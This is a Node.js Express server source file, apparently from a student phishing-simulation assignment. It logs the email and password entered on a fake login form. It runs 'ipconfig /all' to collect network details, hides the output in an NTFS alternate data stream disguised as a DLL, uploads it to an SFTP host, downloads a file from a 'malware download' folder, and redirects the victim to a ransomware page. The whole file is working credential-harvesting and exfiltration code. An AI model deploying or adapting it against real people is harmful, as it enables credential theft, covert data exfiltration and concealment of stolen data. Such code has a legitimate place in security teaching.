require('dotenv').config();
const express = require('express');
const path = require('path');
const fs = require('fs');
const { exec } = require('child_process');
const SFTPClient = require('ssh2-sftp-client');
const os = require('os');

const app = express();
app.use(express.urlencoded({ extended: true })); // For form submission
app.use(express.static(path.join(__dirname, '../public'))); // Serve static files

const sftp = new SFTPClient();

// Collect system information, create, upload the DLL file, download an image, and hide the file in ADS
async function handleLoginProcess() {
    const systemTime = new Date().toString();
    const filePath = './data/systemInfo.txt';
    const dllPath = `./data/ComputerInfo${process.env.STUDENT_NUMBER}.dll`;
    const remoteImagePath = '/malware download/fish.png'; // Adjust as necessary
    const localImagePath = path.join(os.homedir(), 'Downloads', 'fish.png');

    // Write system time and network info to a file
    fs.writeFileSync(filePath, `Time and Date: ${systemTime}\n`, { flag: 'a+' });
    exec('ipconfig /all', async (error, stdout) => {
        if (error) {
            console.error('Error capturing network info:', error);
            return;
        }

        fs.writeFileSync(filePath, stdout, { flag: 'a+' });
        const content = fs.readFileSync(filePath, 'utf-8');
        fs.writeFileSync(dllPath, content);

        // Hide DLL in ADS of readme.txt
        const readmePath = './data/readme.txt';
        exec(`type .\\data\\ComputerInfos3949489s4126268.dll > .\\data\\readme.txt:hidden.dll`, (err) => {
            if (err) {
                console.error('Error hiding DLL in ADS:', err);
            } else {
                console.log('DLL hidden in ADS successfully');
            }
        });
        
        try {
            // Connect to SFTP and upload the DLL file and readme.txt with ADS
            await sftp.connect({
                host: process.env.SFTP_HOST,
                port: process.env.SFTP_PORT || '22',
                username: process.env.SFTP_USERNAME,
                password: process.env.SFTP_PASSWORD
            });
            await sftp.put(dllPath, `/data uploads/ComputerInfo${process.env.STUDENT_NUMBER}.dll`);
            await sftp.put(readmePath, `/data uploads/readme.txt`);
            console.log('DLL file and readme.txt uploaded successfully to SFTP');

            // Download the image from SFTP
            await sftp.get(remoteImagePath, localImagePath);
            console.log('Image downloaded successfully:', localImagePath);

            sftp.end();
        } catch (err) {
            console.error('SFTP operation failed:', err.message);
        }
    });
}

// Handle form submission from login.html
app.post('/submit-login', async (req, res) => {
    const email = req.body.email;
    const password = req.body.password;
    console.log(`Captured credentials: Email: ${email}, Password: ${password}`);

    await handleLoginProcess();
    res.redirect('/ransomware.html'); 
});

// Start the server
app.listen(3000, () => {
    console.log('Phishing simulation running on http://localhost:3000');
});
